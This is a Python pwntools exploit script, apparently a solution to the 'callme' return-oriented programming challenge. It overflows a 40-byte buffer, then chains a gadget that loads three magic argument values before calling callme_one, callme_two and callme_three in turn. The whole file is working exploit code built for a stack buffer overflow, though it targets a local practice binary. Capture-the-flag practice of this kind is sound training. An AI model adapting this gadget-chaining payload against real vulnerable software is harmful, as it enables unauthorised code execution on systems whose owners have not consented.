```python
from pwn import * 

p = process('./callme')
elf = ELF('./callme')

rdi_rsi_rdx_gadget = 0x000000000040093c

callme_one = elf.symbols['callme_one']

callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

payload = b'A'*40 + p64(rdi_rsi_rdx_gadget)+ p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(callme_one)
payload += p64(rdi_rsi_rdx_gadget) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(callme_two)
payload += p64(rdi_rsi_rdx_gadget) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(callme_three)


p.sendline(payload)

p.interactive()
```

